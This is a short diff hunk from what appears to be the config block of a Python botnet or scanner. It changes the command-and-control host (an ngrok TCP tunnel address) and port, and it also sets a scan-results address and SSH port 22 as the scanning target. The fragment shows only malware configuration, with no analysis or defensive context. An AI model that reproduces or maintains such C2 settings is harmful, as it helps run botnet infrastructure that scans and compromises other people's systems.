@@ -20,8 +20,8 @@ import random
 import threading
 import base64 as b64
 #config
-cnc                  = "4.tcp.ngrok.io"#your cnc ip
-cport                = 11170#your cnc port
+cnc                  = "8.tcp.ngrok.io"#your cnc ip
+cport                = 11930#your cnc port
 scan_ip              = "127.0.0.1"#Recevie the scanned ip
 scan_port            = 606#same
 sport                = 22#Scanning port
